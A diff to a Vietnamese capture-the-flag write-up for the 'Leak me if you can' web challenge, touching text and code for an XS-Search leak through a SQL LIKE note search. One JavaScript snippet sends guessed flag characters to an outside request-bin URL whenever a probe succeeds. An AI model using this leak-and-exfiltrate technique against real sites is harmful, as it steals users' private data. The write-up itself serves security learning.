@@ -119,6 +119,8 @@ FLAG; `KCSC{1_just_l34rn_h0w_t0_t3l3p0rt_t0_y0u_<3}`
 
 ## Leak me if you can
 
+Đây là 1 chall có sẵn source nên mọi người dow về và build trên local trước và thử làm.
+
 ### Description:
 
 Khi vào web và thử hết cac chức năng một hồi thì biết được web có chức năng tạo note và lưu trữ và server, có thể xem lại và có 1 trang report để report link cho server. Tiếp tục đọc qua source thì thấy có web còn 1 chức năng nữa đó là tìm kiếm bằng query LIKE của SQL.
@@ -148,7 +150,7 @@ router.get('/notes/search', (req, res) => {
 });
 ```
 
-Server sẽ lấy value của query note mình truyền vào xong rồi tiếp tục cho vào hàm findNote để có thể tìm kiếm trên database. Nếu thấy sẽ trả về note đó và nếu không thấy thfi trả về 404 (mọi người để ý đoạn này).
+Server sẽ lấy value của query note mình truyền vào xong rồi tiếp tục cho vào hàm findNote để có thể tìm kiếm trên database. Nếu thấy sẽ trả về note đó và nếu không thấy thấy trả về 404 (mọi người để ý đoạn này).
 
 Function `findNote`:
 ```javascript
@@ -196,9 +198,9 @@ console.log('Local server running on port: ' + port);
     function checkError(url) {
         let script = document.createElement('script')
         script.src = url
-        // Check url nếu không lỗi (status 200) thì sẽ gửi về request bin để lấy flag
+        // Check url nếu không lỗi (status 200), tức là payload mình gửi lên server là đúng, là tìm thấy các kí tự đó trong flag thì sẽ gửi về request bin để lấy flag
         script.onload = () => window.open("http://requestbin.net/r/f86y55ir/flag=" + url);
-        // Ngược lại thì chả làm gì cả
+        // Ngược lại là query mình gửi lên không tim thấy
         script.onerror = () => console.log(url);
         document.head.appendChild(script)
     }   
@@ -221,7 +223,6 @@ console.log('Local server running on port: ' + port);
 Sau khi đã tạo được server của mình rồi thì cần sử dụng ngrok để có thể truy cập được web đó.
 
 Xong hết tất cả ta đến với script cuối cùng:
-
 
 ```python
 import requests
@@ -265,7 +266,7 @@ Chạy một lúc thì có được flag:
 
 ![image](https://user-images.githubusercontent.com/96786536/166224460-df950fae-8e07-4bfb-8e5a-6986155d5233.png)
 
-Vì là build trên local nên mình không lấy được flag.
+Vì là build trên local nên mình không lấy được flag. Nếu có thắc mắc có thể liên hệ với mình.
 
 
 ## Client-side Check
